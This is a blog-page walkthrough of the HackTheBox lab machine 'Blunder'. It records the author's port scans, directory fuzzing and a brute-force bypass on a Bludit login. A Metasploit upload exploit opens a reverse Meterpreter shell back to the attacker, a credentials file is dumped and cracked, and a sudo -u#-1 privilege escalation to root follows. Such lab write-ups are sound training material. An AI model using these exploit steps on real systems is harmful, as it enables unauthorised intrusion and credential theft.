@@ -1,0 +1,138 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><title>Blunder HackTheBox Walkthrough</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta name=author content="Nasef"><meta name=generator content="Hugo 0.85.0"><link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css><link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css><link href=https://iamnasef.com/scss/style.min.css rel=stylesheet><link rel="shortcut icon" href=https://iamnasef.com/images/favicon.png type=image/x-icon><link rel=icon href=https://iamnasef.com/images/favicon.ico type=image/x-icon></head><body><nav class="navbar navbar-expand-lg site-navigation"><div class=container><a class=navbar-brand href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo.png alt=logo></a>
+<button class="navbar-toggler collapsed" type=button data-toggle=collapse data-target=#sitenavbar>
+<span class=icon-bar></span><span class=icon-bar></span><span class=icon-bar></span></button><div class="collapse navbar-collapse" id=sitenavbar><ul class="navbar-nav ml-auto main-nav"><li class=nav-item><a class=nav-link href=https://iamnasef.com/>Home</a></li><li class=nav-item><a class=nav-link href=https://iamnasef.com/projects>Projects</a></li><li class=nav-item><a class=nav-link href=https://iamnasef.com/courses>Courses</a></li><li class=nav-item><a class=nav-link href=https://iamnasef.com/blog>Blog</a></li><li class=nav-item><a class="nav-link btn btn-sm btn-primary btn-sm-rounded" href=https://iamnasef.com/contact><span class=btn-area><span data-text="Contact Me">Contact Me</span></span></a></li></ul></div></div></nav><main><section class="site-blog details"><div class=container><div class="row justify-content-center"><div class=col-lg-8><article class=site-blog-details><p><span>September 28, 2020</span> by <span>Nasef</span></p><h2 class=blog-title>Blunder HackTheBox Walkthrough</h2><img class=feature-image src=https://iamnasef.com/images/blog/007/featured-image.png alt=blog-feature-image><p>Blunder is a machine in which I used an enumration and a multiple cms exploits to get a shell and then enumeration and another exploit to get root Access.</p><h2 id=scanning>Scanning</h2><p>As always, I started scanning with Nmap</p><pre><code>root@kali:/home/kali# nmap -sC -sV 10.10.10.191
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 10:15 EDT
+Nmap scan report for blunder.htb (10.10.10.191)
+Host is up (0.16s latency).
+Not shown: 998 filtered ports
+PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: Blunder
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Blunder | A blunder of interesting facts
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.15 seconds
+
+</code></pre><p>Http open and ftp closed.</p><h2 id=directory-enumeration>Directory Enumeration</h2><p>Then I enumerated directories and files using gobuster</p><pre><code>root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u blunder.htb -e txt,php,html
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://blunder.htb
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Expanded:       true
+[+] Timeout:        10s
+===============================================================
+2020/09/29 10:16:49 Starting gobuster
+===============================================================                                                   
+http://blunder.htb/about (Status: 200)
+http://blunder.htb/0 (Status: 200)
+http://blunder.htb/admin (Status: 301)
+http://blunder.htb/usb (Status: 200)
+http://blunder.htb/LICENSE (Status: 200)
+</code></pre><p>Found admin directory which contains a login page. then used wfuzz to enumerate directories</p><pre><code>kali@kali:~$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 http://10.10.10.191/FUZZ.txt
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4 - The Web Fuzzer                           *
+********************************************************
+
+Target: http://10.10.10.191/FUZZ.txt
+Total requests: 4658
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                          
+===================================================================
+
+000003519:   200        1 L      4 W      22 Ch       &quot;robots&quot;                                         
+000004125:   200        4 L      23 W     118 Ch      &quot;todo&quot;                                           
+
+Total time: 220.7807
+Processed Requests: 4658
+Filtered Requests: 4656
+Requests/sec.: 21.09785
+
+</code></pre><p>Found todo.txt so I opened it and found a user called fergus</p><pre><code>-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+</code></pre><h2 id=bruteforce>Bruteforce</h2><p>The Login Page It contains rate limit so I searched for an exploit to bypass Rate limit and found <a href=https://raw.githubusercontent.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/master/bruteforce.py>Exploit</a></p><p>If you tried the rockyou list it won&rsquo;t work so I used cewl</p><pre><code>cewl http://10.10.10.191
+</code></pre><p>then used the exploit</p><pre><code>kali@kali:~/Desktop/blunder2$ python exploit.py 10.10.10.191 fergus wordlist 
+[*] Trying: CeWL 5.4.7 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+[*] Trying: the
+....
+[*] Trying: RolandDeschain
+()
+SUCCESS: Password found!
+Use fergus:RolandDeschain to login.
+
+</code></pre><h2 id=exploit>Exploit</h2><p>I searched for an exploits for bludit in metasploit and found one</p><pre><code>msf5 &gt; use exploit/linux/http/bludit_upload_images_exec 
+msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set RHOSTS 10.10.10.191
+RHOSTS =&gt; 10.10.10.191
+msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set BLUDITPASS RolandDeschain
+BLUDITPASS =&gt; RolandDeschain
+msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set BLUDITUSER fergus
+BLUDITUSER =&gt; fergus
+msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit 
+
+[*] Started reverse TCP handler on 10.10.14.110:4444 
+[+] Logged in as: fergus
+[*] Retrieving UUID...
+[*] Uploading ZNhMscEKTp.png...
+[*] Uploading .htaccess...
+[*] Executing ZNhMscEKTp.png...
+[*] Sending stage (38288 bytes) to 10.10.10.191
+[*] Meterpreter session 1 opened (10.10.14.110:4444 -&gt; 10.10.10.191:41004) at 2020-09-29 10:31:07 -0400
+
+</code></pre><h2 id=from-web-to-hugo>From Web to Hugo</h2><p>I started enumeration and found an interesting credentials in</p><pre><code>cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
+&lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;
+{
+    &quot;admin&quot;: {
+        &quot;nickname&quot;: &quot;Hugo&quot;,
+        &quot;firstName&quot;: &quot;Hugo&quot;,
+        &quot;lastName&quot;: &quot;&quot;,
+        &quot;role&quot;: &quot;User&quot;,
+        &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;,
+        &quot;email&quot;: &quot;&quot;,
+        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,
+        &quot;tokenRemember&quot;: &quot;&quot;,
+        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,
+        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
+        &quot;twitter&quot;: &quot;&quot;,
+        &quot;facebook&quot;: &quot;&quot;,
+        &quot;instagram&quot;: &quot;&quot;,
+        &quot;codepen&quot;: &quot;&quot;,
+        &quot;linkedin&quot;: &quot;&quot;,
+        &quot;github&quot;: &quot;&quot;,
+        &quot;gitlab&quot;: &quot;&quot;}
+}
+</code></pre><p>So, I started cracking the hash
+<img src=/images/blog/007/1.png alt=Username></p><p>then started su to hugo</p><pre><code>su hugo              
+Password: Password120
+whoami
+hugo
+</code></pre><p>Then tried to try sudo -l</p><pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -l
+sudo -l
+Password: Password120
+
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+</code></pre><p>I tried to bypass the this sudo permissions to run /bin/bash using this <a href=https://www.exploit-db.com/exploits/47502>Exploit</a></p><pre><code>hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash
+&lt;-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash       
+root@blunder:/var/www/bludit-3.10.0a/bl-content/databases#  
+
+</code></pre><p>and voila here is the root privilege!</p></article></div></div></div></section><section class=site-cta id=contact style=background-image:url(https://iamnasef.com/images/backgrounds/cta-background.jpg)><div class=container><div class=row><div class="col-12 text-center"><h1 class=site-cta-title>SAY HELLO</h1><a class=mail-link href=mailto:hello@iamnasef.com><h2 class=mail>HELLO@IAMNASEF.COM</h2></a><div class=sm-links><a href=https://twitter.com/iamnasef><i class="fa fa-twitter-square" aria-hidden=true></i></a>
+<a href=https://www.linkedin.com/in/iamnasef/><i class="fa fa-linkedin-square" aria-hidden=true></i></a>
+<a href=https://github.com/iamnasef><i class="fa fa-github-square" aria-hidden=true></i></a>
+<a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ><i class="fa fa-youtube-square" aria-hidden=true></i></a></div></div></div></div></section></main><footer class=site-footer><div class=container><div class=row><div class=col-12><div class=site-footer-logo><a href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo-footer.png alt=logo-footer width=100px height=100px></a></div></div><div class="col-lg-3 col-md-6"><div class=site-footer-widget><h5 class=site-footer-widget-title>Contact Info</h5><p class=site-footer-widget-description><a href=mailto:hello@iamnansef.com>hello@iamnansef.com</a></p></div></div><div class="col-lg-2 col-md-6"><div class=site-footer-widget><h5 class=site-footer-widget-title>Check it</h5><ul class=site-footer-widget-links><li><a href=https://iamnasef.com/blog>Blog</a></li><li><a href=https://iamnasef.com/projects>Projects</a></li><li><a href=https://iamnasef.com/courses>Courses</a></li><li><a href=https://iamnasef.com/contact>Contact</a></li></ul></div></div><div class="col-lg-2 col-md-6"><div class=site-footer-widget><h5 class=site-footer-widget-title>Social Media</h5><ul class=site-footer-widget-links><li><a href=https://www.linkedin.com/in/iamnasef/>Linkedin</a></li><li><a href=https://twitter.com/iamnasef>Twitter</a></li><li><a href=https://github.com/iamnasef>Github</a></li><li><a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ>YouTube</a></li></ul></div></div><div class="col-lg-3 col-md-6"><div class=site-footer-widget><h5 class=site-footer-widget-title>Keeping you safe</h5><p class=site-footer-widget-description>Application Security Engineering<br>Cyber Security Technical Training<br>Cyber Security Awarness</p></div></div><div class="col-lg-2 col-12"><a href=#top class=site-footer-widget-top><img src=https://iamnasef.com/images/to-top.svg alt=back-to-top><p>I want to<br>visit again</p></a></div></div></div></footer><script src=https://iamnasef.com/js/formhandler.min.js></script><script src=https://iamnasef.com/js/vendor.min.js></script><script src=https://iamnasef.com/js/script.min.js></script></body></html>
